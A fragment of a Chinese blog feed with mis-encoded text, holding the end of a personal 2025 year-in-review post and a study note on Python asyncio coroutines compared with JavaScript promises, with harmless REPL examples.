<h2 id="5-å»åäº¬ä¸è¶ææèå­æ¡äºåæ¥">5. å»åäº¬ä¸è¶ï¼ææèå­æ¡äºåæ¥</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154723557-522141844.png" class="lazyload"></p>
<p>åææå»åäº¬åå äºä¸ä¸ªæ´»å¨ï¼ä¹ç®ç¬¬ä¸æ¬¡ä¸ºäºè¿ç±»äºåºè¿é¨ã2026å¹´ï¼å¤è¾åºAIï¼å¤åå æ´»å¨ã</p>
<p>ç°åºäººå¾å¤ï¼èå¥å¾å¿«ï¼ä¿¡æ¯å¯å¾è®©äººåä¸è¿æ°ãé£å¤©ææå¤§çæåï¼ä¸æ¯è§äºä»ä¹äº§åï¼èæ¯çªç¶æç½ï¼æºä¼ççä¼ä»æèº«è¾¹èµ°è¿å»ï¼èµ°è¿å»å°±æ²¡äºãå¾å¤æ¶åä¸æ¯æä¸å¤å¥½ï¼æ¯æä¸æ¢ç«åºæ¥ï¼æèæä¸æè¯è§å¾âæè¿ä¸å¤æ ¼âã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154732860-301297098.png" class="lazyload"></p>
<p>å»å¤©æ´¥è·¯ä¸ï¼çæçæè§</p>
<p>æä¹å»äºå¤©æ´¥ï¼è§äºèæåèæãæä»¬èäºä¸æ´å¤©ï¼æå¸®ä»æ¬è¿æ´çé£åï¼ä»å¸¦æåäºå¤©æ´¥èï¼çè³è®©æä½éªäºä¸æä¿æ¶æ· 911ãæåä»ææéå°æºåºã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154741516-298271030.png" class="lazyload"></p>
<p>é£ä¸å¤©è®©æå¾ææ¨ï¼è¿ä¸ªä¸çå¶å®å¾å¤§ï¼ä¹å¾æ´»ï¼æä¸è½æ»æèªå·±å°å¨âæéº»ç¦ãæå°´å°¬ãæåºä¸âçæç»ªéã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154747190-1732708869.png" class="lazyload"></p>
<p>ä»å¹´æä¹ä¹°äºä¸å°ä¹¦ï¼ä¹è¯»äºä¸å°ä¹¦ããäº²å¯å³ç³»ããè®¤ç¥é©±å¨ããçº³ç¦å°å®å¸ãâ¦â¦å®ä»¬æ²¡æç»ææ åç­æ¡ï¼ä½ç»äºææ´æ¸éçè§è§ï¼æè¦å¯¹èªå·±çæç»ªè´è´£ï¼å¯¹èªå·±çéæ©è´è´£ï¼å¯¹èªå·±çé¿æè´è´£ã</p>
<hr>
<h2 id="6-æç¸ä¿¡è¿ä»ä¹å æ­¤å®æäºä¸æ¬¡ç¥é­">6. æç¸ä¿¡è¿ä»ï¼ä¹å æ­¤å®æäºä¸æ¬¡ç¥é­</h2>
<p>åä¸æåºï¼æåäºä¸ä¸ªå¾éçå³å®ï¼ç¦»èï¼å»åäº¬è¯ä¸æ¬¡ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154752744-2124682398.png" class="lazyload"></p>
<p>è¿ä»¶äºæå¹¶ä¸æ¯å²å¨ãç¸åï¼ææ³äºå°è¿ä¸ä¸ªæãæåâä»âéè¯·è¿æä¸æ¬¡ï¼åä¸¤æ¬¡æé½æç»äºãç¬¬ä¸æ¬¡åå§äººäº²èªæ¾æï¼è¯è¯´å¾å¾æ¼äº®ï¼æªæ¥ç»å¾å¾å¤§ï¼èæä¹ç¡®å®å¨é£ä¸ªé¶æ®µæ¸´æä¸æ¬¡æ´å¤§çç©ºé´ãåå ä¸å¯¹âä»âçä¿¡ä»»ï¼ææç»ç¹äºå¤´ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154759317-1347714350.png" class="lazyload"></p>
<p>ç¦»å¼åï¼æåäºä¸ä»¶æå¾æ³åçäºï¼æç¸ç¸æ¥å°ä¸æµ·ãé£æ¯ä»ç¬¬ä¸æ¬¡æ¥ä¸æµ·ï¼ä¹æ¯ä»ç¬¬ä¸æ¬¡åé£æºãæå»æ¥ä»çæ¶åï¼ä»è¸ä¸çåæ¦èä¸ä½ãæå¸¦ä»éäºå¾å¤å°æ¹ï¼æäºå¾å¤ç§çãéä»å»æºåºé£å¤©ï¼æå¿éå¾è¸å®ââé£ç§æå°±æï¼ä¸æ¥èªä»»ä½è¯ä»·ï¼åªæ¥èªâæè½å¸¦ä»çä¸çâçç¬é´ã</p>
<p>ä»å¹´æä¹ç»å¦å¦ä¹°äºæ°ææºï¼å¥¹ä¹åé£é¨å¤ªå¡äºãåå°çäºæï¼è½å¨ç¶æ¯èº«ä¸é½æ¯å®å¨çæ¹åã</p>
<p>ç¶åæå»äºåäº¬ã</p>
<p>ç°å®å¾å¿«ç»äºæä¸è®°é·æ£ãä¹åè¯´çåå®éå·®å¤ªå¤å¤ªå¤ãæä¼å¨å¾ç­æ¶é´ååç°ï¼æäºè¯åªæ¯è¯ï¼æäºæ¿è¯ºåªæ¯æç»ªï¼æäºâæ ¼å±âåªæ¯åè£ãæä¸æ³å¨è¿éåå·ä½ç»èï¼ä½æå¯ä»¥åç»è®ºââè¿æ¬¡ç»åè®©æå®æäºä¸æ¬¡ç¥é­ï¼å¯¹äººãå¯¹æè°âæºä¼âãå¯¹âçèµ·æ¥å¾ç¾âçæªæ¥ã</p>
<p>æä¹æ´æ¸æ¥äºä¸ä»¶äºï¼æå¹¶ä¸æ¯ä¸è½åè¦ï¼ææ¯ä¸æ¿æææçå°ä¸¥åæ¶é´æ¼å¨ä¸é è°±çäººåä¸é è°±çäºä¸ã</p>
<hr>
<h2 id="7-ææäºä¸åªçä¹è¢«è¿åº§åå¸çåææ¥ä½">7. ææäºä¸åªçï¼ä¹è¢«è¿åº§åå¸çåææ¥ä½</h2>
<p>è¿ä¸å¹´ææäºä¸åªçã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154806749-1255965763.png" class="lazyload"></p>
<p>ç¬¬ä¸åªæ¯ä¸­åç°å­ç¬ï¼å¨å¬å­éå°çãå®å¾ç¦ï¼ç¼ç¥æ¯ï¼ä½åä¸èº²äººã</p>
<p>ç¬¬äºåªæ¯è¾¹ç§ï¼å¨å¬å¸éè¿ï¼å®æ´åæ¯èµ°ä¸¢çå­©å­ï¼èªæåæ å©ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154813108-1263644004.png" class="lazyload"></p>
<p>ç¬¬ä¸åªæ¯é¿ææ¯å ï¼å¨è±«å­éè¿ï¼ä½åå¾å¤§ï¼å´ä¸ç¹å®å¨æé½æ²¡æã</p>
<p>æåæ¬¢çãéè§å®ä»¬çæ¶åï¼æå¾é¾è£ä½æ²¡çè§ãæåçäºå¶å®ä¹ä¸å¤æï¼æç§ãåå¸ãèç³»ãç­éé¢å»äººãæä¿¡æ¯å¯¹é½æ¸æ¥ï¼ç¶åéå®ä»¬å»æ°å®¶ã</p>
<p>è¿ä»¶äºææå¨æçï¼ä¸æ¯æå¤åè¯ï¼èæ¯æåç°ï¼å¤§åå¸ççæå¾å¤æ¿æä¼¸æçäººãæååºæ±å©ï¼ççä¼æäººååºãæä»¥ä¸ºæå¨æå®ä»¬ï¼å¶å®å¨æäºæ¶å»ï¼æ¯è¿äºåæå¨ææä»ç²æ«éæ¥ä½ã</p>
<hr>
<h2 id="8-ä¸ç¬æ²æ²¡ææ¬æ­¢æç»´æåä¸åå§å±èªå·±">8. ä¸ç¬æ²æ²¡ææ¬ï¼æ­¢æãç»´æãåä¸åå§å±èªå·±</h2>
<p>åäºæåï¼åäº¬ç»äºææç¡¬çä¸è¯¾ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154821656-1585583893.png" class="lazyload"></p>
<p>æå¨åäº¬å¾äºåæ¥å¤©ï¼ä¸ç´ä½éåºãå¯¹æ¹ä¹åè¯´ä¼æ¥éï¼ä½åæ¥ä»ä¹é½æ²¡æãå¥èåä¸å¤©ææ¾äºæ¿å­ï¼ç§æ¿è´¹ç¨ãä¸­ä»è´¹ç¨ãåå ä¸åç§å¥æ³¢ææ¬ï¼å èµ·æ¥æ¯ä¸ç¬ä¸å°çæ¯åºãæ´ç³çæ¯ï¼å¥èç¬¬ä¸å¤©æå°±éè¿å¦ä¸ä½åæ ·å¤å¢çäººäºè§£å°äºçå®æåµï¼åå ä¸âä»âä¸ç­åè¯´çä¸äºè¯ï¼æå¾å¿«ç¡®å®ââè¿éä¸æ¯æè¯¥å¾çå°æ¹ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154826834-1184767807.png" class="lazyload"></p>
<p>é£ä¸å»æé¾çå¶å®ä¸æ¯ç¦»å¼ï¼èæ¯é¢å¯¹æ²æ²¡ææ¬ãæå·²ç»ä»åºé£ä¹å¤ï¼æä¼æ¬è½å°æ³âåå¿å¿ï¼åç­ç­âãä½æå¾åºå¹¸ï¼é£å¤©ææ²¡éªèªå·±ãæéæ©æ­¢æã</p>
<p>éä¹èæ¥çå°±æ¯ç»´æãæ¿å­ææ²¡å¥ä½ï¼ååæ¥æä¹æ²¡å¼å§ï¼ä½ç®¡å®¶å¾æ èµï¼çè³å¸¦çæåãé£ç§âæè®²çä»å°±èèµâçæè§å¾æ¶å¿ãæä¸å¼å§ä¹å¾ç¦ï¼åæ¥å¹²èä¸åå¥¹åºè¯ï¼ç´æ¥èµ°æµç¨ï¼éè¿ 12315 åè°ï¼æ¿åäºä¸é¨åãçè®ºä¸å¯ä»¥æ¿åæ´å¤ï¼ä½è¦ç»§ç»­èæ¶é´ç²¾åï¼æå½æ¶éæ©å°æ­¤ä¸ºæ­¢ã</p>
<p>è¿ä¸æ®µæ¶é´ï¼è®©å®¶éä¹æ²¡å°æå¿ï¼å....</p>
<p>æææ³åç»èªå·±çä¸æ¯âé±äºäºâï¼èæ¯ä¸ä¸ªæ´éè¦çç»è®ºï¼<strong>ä»¥åéå°ä¸å¬ï¼æä¸åç¨å§å±æ¢åå¹³ãè¯¥ç»´æå°±ç»´æï¼è¯¥ç¿»è¸å°±ç¿»è¸ã</strong></p>
<hr>
<h2 id="9-åå°ä¸æµ·ææèªå·±ä¸ç¹ç¹æåæ­£è½¨">9. åå°ä¸æµ·ï¼ææèªå·±ä¸ç¹ç¹æåæ­£è½¨</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154833625-691020076.png" class="lazyload"></p>
<p>åäºæä¸­æ¬æåå°äºä¸æµ·ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154838643-199424343.png" class="lazyload"></p>
<p>æ¶æ¾å¥½å®¶éçå·¥ä½</p>
<p>é£æ®µæ¶é´æè½éå¾ä½ãä¸æ¯ç´¯ï¼æ¯ä¸ç§è¢«ç°å®æè¿ä¹åçéãæä¼æçèªå·±ãæçå¤æ­ãæçä¿¡ä»»ï¼çè³æçâæ¯ä¸æ¯æå¤ªææäºâãä½çæ´»ä¸ä¼ç­æç¼è¿æ¥ï¼å®åªä¼ç»§ç»­å¾åã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154846060-1154962087.png" class="lazyload"></p>
<p>æåçç¬¬ä¸ä»¶äºæ¯ææèªå·±æåæ­£å¸¸ï¼åé¥­ãç¡è§ãè§æåãåæ¥æåèè¿å»äºæ­å·æ£å¿ãåå¸å¾å®éï¼èµ°å¨è·¯ä¸æçªç¶åç°ï¼é£è¿æ¯ä¸æ ·å¹ï¼ç¯è¿æ¯ä¸æ ·äº®ï¼æä¸ä¼å ä¸ºåæ«å°±å¤±å»æå¤©ã</p>
<p>ææ¢æ¢æ§ä½åºäºãæçæ´»æåæ­£è½¨äºãä¹æé£å¥æéè¦çè¯éæ°æ¡åæ¥ââ<strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<hr>
<h2 id="æå">æå</h2>
<p>åå¤´ç 2025 å¹´ï¼ææå¤§çååä¸æ¯âæåäºå¤å°âï¼èæ¯<strong>æå¯¹äººçç»æçè¦æ±åé«äº</strong>ã</p>
<p>ä»¥åæä¼æåªåå½æç­æ¡ãç°å¨ææ´å¨æï¼è¿ä»½åªåè½ä¸è½æ²æ·ï¼è½ä¸è½è®©ææ¥ææ´å¤éæ©æãä»¥åæéå°çäºä¼åå¿ï¼æ³çâç®äºâãä½åäº¬é£ä¸æ®µä¹åææ´ç¡®å®ï¼å§å±ä¸ä¼æ¢æ¥å°éï¼åªä¼æ¢æ¥ä¸ä¸æ¬¡æ´å¤§çä»£ä»·ãè¯¥æ­¢æå°±æ­¢æï¼è¯¥ç»´æå°±ç»´æââåªææ²æ²¡ææ¬å·²ç»ç ¸ä¸å»ï¼æä¹è¦æèªå·±ä»æ³¥éæåºæ¥ã</p>
<p>è¿ä¸å¹´æä¹å®æäºä¸æ¬¡ç¥é­ï¼<br>
å¯¹âæºä¼âçç¥é­ï¼å¯¹âå³ç³»âçç¥é­ï¼å¯¹âç»åºæ¥çæªæ¥âçç¥é­ã<br>
æå¼å§ç¸ä¿¡ä¸å¥è¯ï¼<strong>çæ­£å¼å¾çæºä¼ï¼ä¸ä¼åªé å´è¯´ï¼çæ­£å¯é çäººï¼ä¹ä¸ä¼åªé æç»ªç»æ¶ã</strong></p>
<p>å¦æè¯´ 2025 å¹´æä¼äºæä»ä¹ï¼æè§å¾æ¯ä¸ä»¶äºï¼</p>
<p>ç¬¬ä¸ï¼è½åä¸æ¯æ¿æ¥éå¼ºçï¼æ¯æ¿æ¥ååºçã<br>
æå¨æç¼ççæ¶åï¼é èªå·±æå±é¢ç¨³ä½äºãé£ç§âæè½æä½âçåºæ°ï¼æ¯ççã</p>
<p>ç¬¬äºï¼é±è±å¨å®¶äººèº«ä¸ï¼ä¼åæä¸ç§å¾è¸å®çæå°±æã<br>
æä»¥åä»¥ä¸ºæå°±ææ¥èªå¤çè®¤å¯ï¼ä»å¹´ææ´ç¡®å®ï¼æ¥èªç¶æ¯çç¬ãæ¥èªå®¶äººçå®å¿ãæ¥èªâæå¯ä»¥ç§é¡¾ä»ä»¬âã</p>
<p>ç¬¬ä¸ï¼åææ¯ä¼æµå¨çã<br>
æå¸®è¿äººï¼ä¹è¢«äººå¸®è¿ï¼ææè¿çï¼ä¹è¢«éçäººçç­å¿æ²»æè¿ãä¸çä¸å¨æ¯çäººï¼ä½æå¾å­¦ä¼è¯å«ï¼å­¦ä¼ç­éï¼å­¦ä¼ä¿æ¤èªå·±ã</p>
<p>2026 å¹´æä¸æ³ååå£å·äºãæåªæ³åä¸ä»¶æ´å·ä½çäºï¼</p>
<ul>
<li><strong>æä¸æ¡è½é¿æè·çä¸»çº¿ååºæ¥</strong>ï¼è®©è¾åºãä½ååæå¡çæ­£å½¢æç¨³å®çèå¥ï¼èä¸æ¯é è¿æ°èµ·ä¼ã</li>
<li><strong>ç»ä¿¡ä»»ç«è§ç©</strong>ï¼åä½è¦æè¾¹çï¼æ¿è¯ºè¦è½è½å°ï¼ä»»ä½å³å®é½è¦çåæã</li>
<li><strong>æå®¶æ¾è¿è®¡åé</strong>ï¼ä¸æ¯âæç©ºåè¯´âï¼èæ¯æ¬æ¥å°±è¯¥æå¨åé¢ã</li>
</ul>
<p>2025 å¹´æ²¡ææææ¨å°é«å¤ï¼ä½å®ææä»å¹»è§éæ½åºæ¥äºã<br>
æä¾ç¶ä¼å¾åèµ°ï¼åªæ¯ä»¥åææ´å¨ä¹çä¸æ¯éåº¦ï¼èæ¯æ¹åï¼ä¸æ¯ç­é¹ï¼èæ¯ç»æã</p>
<p><strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<p>å¸æ2026å¹´ä¸åé¡ºå©!</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202509/1654515-20250919164521947-329959870.png" class="lazyload"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 15:50">2026-01-16 15:50</span>&nbsp;
<a href="https://www.cnblogs.com/HaiJun-Aion">ç¨åºåæµ·å</a>&nbsp;
éè¯»(<span id="post_view_count">73</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492492);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492492', targetLink: 'https://www.cnblogs.com/HaiJun-Aion/p/19492492', title: 'æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãç¬è®°ãA Conceptual Overview of asyncio ]]></title>
    <link>https://www.cnblogs.com/wngtk/p/19491520</link>
    <guid>08cc930c18963ee73b724a250c9f4514</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/wngtk/p/19491520" title="åå¸äº 2026-01-16 14:07">
    <span role="heading" aria-level="2">ãç¬è®°ãA Conceptual Overview of asyncio</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>è¯»äºè¿ä¸¤ç¯ï¼ä¹å¯ä»¥è¯´æ¯ä¸ç¯ï¼ï¼æææ­£ç¡®è®¤è¯äº Python çåç¨ãä¸è½ç´æ¥æ Python async/await å½ä½ JavaScript async/awaitä¸æ ·çä¸è¥¿ã</p>
<ul>
<li><a href="https://docs.python.org/3/howto/a-conceptual-overview-of-asyncio.html" target="_blank" rel="noopener nofollow">https://docs.python.org/3/howto/a-conceptual-overview-of-asyncio.html</a></li>
<li><a href="https://github.com/anordin95/a-conceptual-overview-of-asyncio/tree/main" target="_blank" rel="noopener nofollow">https://github.com/anordin95/a-conceptual-overview-of-asyncio/tree/main</a></li>
</ul>
<p>å¨å­¦ä¹  Python åç¨ä¹åï¼æå¯¹ JavaScript åç¨å·²ç»ç¥æäºè§£ï¼å¨ JavaScript async/await å¾ç´è§ç´æ¥ç¨å°±å¯ä»¥ï¼å¨å­¦ä¹  Python åç¨çè¿ç¨ä¸­ï¼æåç°æå¯¹ JavaScript Promise ä¹å¿äºä¸å°ï¼ä¹ååè¿ä¸ä¸ªåå®¢è®°å½ã</p>
<h2 id="ä¸å¼å§æä¸çæ-python-asyncio">ä¸å¼å§æä¸çæ Python asyncio</h2>
<p>Python çåç¨ç¨èµ·æ¥éè¦ç¨<code>asyncio.run()</code>ï¼å¨ Python 3.6 è¿æ²¡æ<code>asyncio.run()</code>ã<code>asyncio.create_task()</code> ä¸ºä»ä¹æ¥é No running event loop</p>
<pre><code class="language-python">Python 3.12.3 (main, Jan  8 2026, 11:30:50) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import asyncio
&gt;&gt;&gt; async def foo(): ...
...
&gt;&gt;&gt; asyncio.create_task(foo())
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python3.12/asyncio/tasks.py", line 417, in create_task
    loop = events.get_running_loop()
           ^^^^^^^^^^^^^^^^^^^^^^^^^
RuntimeError: no running event loop
&gt;&gt;&gt;
</code></pre>
<h2 id="åç¨ä¸ä¼ç«å»æ§è¡">åç¨ä¸ä¼ç«å»æ§è¡</h2>
<p>è°ç¨å¼æ­¥å½æ°ï¼åå»ºäºä¸ä¸ªåç¨å¯¹è±¡ãåç¨å¯¹è±¡åé¨çé»è¾ä¸ä¼ç«å»æ§è¡ï¼ç­å°äºä»¶å¾ªç¯æ¥ææ§å¶æï¼å¹¶ä¸å¯å¨/ç»§ç»­åç¨çæ¶åï¼åç¨çé»è¾æä¼æ§è¡ã</p>
<pre><code class="language-python">Python 3.12.3 (main, Jan  8 2026, 11:30:50) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import asyncio
&gt;&gt;&gt; async def foo(): print('bar')
...
&gt;&gt;&gt; foo()
&lt;coroutine object foo at 0x720ef6db5a80&gt;
&gt;&gt;&gt;
</code></pre>
<p>æä»¬å¯ä»¥çå°åç¨çåé¨çé»è¾æ²¡ææ§è¡ãè¦æ§è¡è¿ä¸ªåç¨æä»¬å¯ä»¥ä½¿ç¨ <code>asyncio.run()</code>ã</p>
<pre><code class="language-python">&gt;&gt;&gt; asyncio.run(foo())
bar
</code></pre>
<p>å¨ Python çåç¨ä¸­ï¼è¦æ³å¯å¨å¦å¤ä¸ä¸ªåç¨ï¼å°±è¦ç¨ <code>asyncio.create_task()</code> åå»ºä¸ä¸ª Task å¹¶ä¸åäºä»¶å¾ªç¯å³èèµ·æ¥ï¼è¿ä¸ªå½æ°ä¼æ¾å°å½åæ­£å¨è¿è¡çäºä»¶å¾ªç¯ãä¸ä¸ªçº¿ç¨åªæä¸ä¸ªæ­£å¨è¿è¡çäºä»¶å¾ªç¯ã</p>
<p><code>asyncio.run()</code> å <code>asyncio.create_task()</code> å¸®æåäºä¸äºäºæï¼ä½æ¯æä¸ç¥éä»å°åºå¹²ä»ä¹äºãèå®è¯´ï¼æå¾è®¨åç¼ç¨è¯­è¨åç§éå¼çè¡ä¸ºã</p>
<p><code>asyncio.run()</code> ç¸å½äºæ¯è¿æ ·å è¡ï¼</p>
<pre><code class="language-python">loop = asyncio.new_event_loop()
task = asyncio.Task(foo(), loop=loop)
loop.run_util_complete(task)
</code></pre>
<p>run_util_complete æ¯æ coroutineï¼ä¹å¯ä»¥ä¸æå¨åå»º Task.</p>
<pre><code class="language-python">loop = asyncio.new_event_loop()
loop.run_util_complete(foo())
</code></pre>
<p>æä»¬è§å°äºæå¨åå»º Task çæ¹æ³ï¼å¯ä»¥æ³è±¡å° create_task æ¯å¦ä½ç¥éæ¾å¨åªä¸ªäºä»¶å¾ªç¯ä¸çã</p>
<pre><code class="language-python">def create_task(coro):
  loop = asyncio.get_running_loop()
  return asyncio.Task(coro, loop=loop)
</code></pre>
<p>JavaScript è°ç¨å¼æ­¥å½æ°ç´æ¥å°±æ§è¡äºå½æ°ä½ï¼åªæä½ ä¸å  awaitãJavaScript å¼æ­¥å½æ°ä½å°±ç¸å½äºä¼ éç» Promise çåè°å½æ°ã</p>
<pre><code class="language-js">let promise = new Promise(function(resolve, reject) {
  // this function will executes immediately
})
</code></pre>
<h2 id="è®©æ­¥æ§å¶æç»äºä»¶å¾ªç¯">è®©æ­¥æ§å¶æç»äºä»¶å¾ªç¯</h2>
<pre><code>class YieldToEventLoop:
    def __await__(self):
        yield
</code></pre>
<blockquote>
<p>The only way to yield (or effectively cede control) from a coroutine is to await an object that <code>yield</code>s in its <code>__await__</code> method.</p>
</blockquote>
<p><strong>å¨ä¸ä¸ªå¯¹è±¡ç <code>__await__</code> æ¹æ³ä¸­ yield æ¯è®©æ­¥æ§å¶æç»äºä»¶å¾ªç¯çå¯ä¸çæ¹å¼</strong>ã<code>await object</code> ä¼è°ç¨å¯¹è±¡ç <code>__awit__</code> æ¹æ³ã</p>
<p>await coroutine ä¸ä¼å°æ§å¶æäº¤ç»äºä»¶å¾ªç¯ï¼ç®åç await coroutine å°±å¥½ä¼¼ yield from generatorãè¿å¯¹çæ JavaScript åç¨çäººæ¯å¾åç´è§çãPython çç»å¸åç¨ï¼ä¹å°±æ¯ Python çæå¨å½ä½åç¨ä½¿ç¨ï¼ä½æ¯æä»¬æ²¡æäºä»¶å¾ªç¯ã</p>
<p>coroutine æçæ¯ coroutine objectãè°ç¨ä¸ä¸ª async function ä¼åå»ºä¸ä¸ª coroutine objectã</p>
<p><strong>await ä¸ä¸ª Task(Future) å¯¹è±¡å°±ä¼è®©æ­¥æ§å¶ç»äºä»¶å¾ªç¯</strong>ãTask æ¯ Future çå­ç±»ï¼Future ç <code>__await__</code> æ¹æ³ä¼ yieldã</p>
<p>æ³¨æï¼æä»¬ä¸è½ç´æ¥å¨å¼æ­¥å½æ°ï¼åç¨å½æ°ï¼éé¢ç´æ¥å yield å®ç°è®©æ­¥æ§å¶ç»äºä»¶å¾ªç¯ï¼è°ç¨å½æ°å°±ä¼åæå¼æ­¥çæå¨ã</p>
<h2 id="æä»¬éè¦ææ-task-å¯¹è±¡å¹¶ä¸-await">æä»¬éè¦ææ Task å¯¹è±¡ï¼å¹¶ä¸ await</h2>
<blockquote>
<p>Itâs important to be aware that the task itself is not added to the event loop, only a callback to the task is. This matters if the task object you created is garbage collected before itâs called by the event loop</p>
</blockquote>
<p>Task å¯¹è±¡ä¸å®è¦æåéææï¼å¹¶ awaitãä¸ç¶å½åéè¶åºä½ç¨åï¼è¢« GC åæ¶åï¼åç¨æ²¡æ§è¡å®èªå·±å°±éææéåºäºï¼ä¸ä¼æ¥éï¼ãTask å¯¹è±¡ GC åæ¶ï¼<s>é£ä¹ coroutine å¯¹è±¡ä¹è¢«åæ¶äº</s>ã</p>
<p>è¯´å®è¯ï¼æå¾é¾çè§£äºä»¶å¾ªç¯æ²¡æ Task å¯¹è±¡ãä½æ¯åè¿æ¥ JavaScript ç Promise .then çæ¶åä¸å°±æ¯å¨æ³¨ååè°å½æ°åï¼V8 çå¾®ä»»å¡éåéé¢ä¸æ¯ä¿å­ Promise çå¯¹è±¡ï¼æ¯åè°å½æ°åã</p>
<pre><code class="language-python">import asyncio

async def async_print(str):
    print(str)

async def coro_a():
    for _ in range(3):
        await async_print("I am coro_a()!")

class YieldToEventLoop:
    def __await__(self):
        yield

async def coro_b():
    for _ in range(3):
        print("I am coro_b()!")
        await YieldToEventLoop() # neccessay to show coro_b() one time

async def main():
    task = asyncio.create_task(coro_b())
    await coro_a()

asyncio.run(main())

# Output:
# I am coro_a()!
# I am coro_a()!
# I am coro_a()!
# I am coro_b()!

</code></pre>
<p>å¦æè¯»æäºè¿ä¸ªä¾å­ï¼é£ä¹å°±è¯»æäºæ´ç¯ç¬è®°æèåæäºã</p>
<p>main() å½æ°åå»º task åæ²¡æ await taskï¼ä¸ä¼è®©æ­¥æ§å¶æç»äºä»¶å¾ªç¯ï¼æä»¥ main å½æ°ç»§ç»­æ§è¡ãawait coro_a å¨ await coroutineï¼ä¸ä¼è®©æ­¥æ§å¶ç»äºä»¶å¾ªç¯ï¼æ§è¡ coro_a()ã<code>coro_a()</code> await çä¹æ¯åç¨å¯¹è±¡ï¼ä¹ä¸ä¼è®©æ­¥ç»äºä»¶å¾ªç¯ï¼æä»¥è¿çæå°äºä¸æ¬¡<code>I am coro_a()!</code>ãå¾ªç¯æ§è¡å®æ¯å <code>main()</code> åç¨å¯¹è±¡æ§è¡å®äºï¼äºä»¶å¾ªç¯ææ¿å°æ§å¶æï¼å¼å§æ§è¡ <code>coro_b</code> çé»è¾ã<code>coro_b</code> åå¼å§ä¸æ¬¡ï¼åç¨ <code>await YieldToEvnetLoop</code> è®©æ­¥æ§å¶ç»äºä»¶å¾ªç¯ãå ä¸º main() å½æ°æ©å·²æ§è¡å®æ¯éåº task æ©å·²è¶åºä½ç¨åï¼è¢« GC åæ¶ï¼ç­äºä»¶å¾ªç¯åæ¬¡è¿è¡ coro_b çæ¶ååç°å¯¹åºç Task å¯¹è±¡å·²ç»è¢« GC åæ¶äºãæä»¥å°±æå°äºä¸æ¬¡ <code>I am coro_b()!</code>ã</p>
<p>æå¾å¥½å¥ï¼è¿ä¸ªå°æ¹åå»ºåè°å½æ°çæ¶åæä¹å°±æ²¡æå½¢æé­åå¢ï¼æä¹å°±æ²¡ææ task å¯¹è±¡éèå¨é­åéé¢å¢ï¼</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>await åç¨ä¸ä¼è®©æ­¥æ§å¶æï¼await Future æä¼è®©æ­¥æ§å¶æç» Event Loopãå®ç°åç¨è®©æ­¥å°±æ¯å¨ <code>__await__</code> æ¹æ³ä¸­ yieldã</p>
<p>Python ä¸å JavaScript æå¾®ä»»å¡éåï¼æä»¬éè¦èªå·±ä¸»å¨å»åå»ºäºä»¶å¾ªç¯ï¼å¹¶å°ä»»å¡æ¾å°äºä»¶å¾ªç¯ä¸­å»ï¼å½ç¶æ´åç¡®çè¯´æ³æ¯å¨äºä»¶å¾ªç¯ä¸­æ³¨ååè°å½æ°ãä¹å°±æ¯ <code>asyncio.create_task()</code>, <code>asyncio.run()</code> è¿ä¸¤ä¸ªå½æ°ã</p>
<p>JavaScript é½æ¯ Promise å¯¹è±¡ï¼await Promise å¯¹è±¡å°±ä¼è®©æ­¥ã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 14:07">2026-01-16 14:07</span>&nbsp;
<a href="https://www.cnblogs.com/wngtk">wngtk</a>&nbsp;
éè¯»(<span id="post_view_count">76</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19491520);return false;">æ¶è</a>&nbsp;
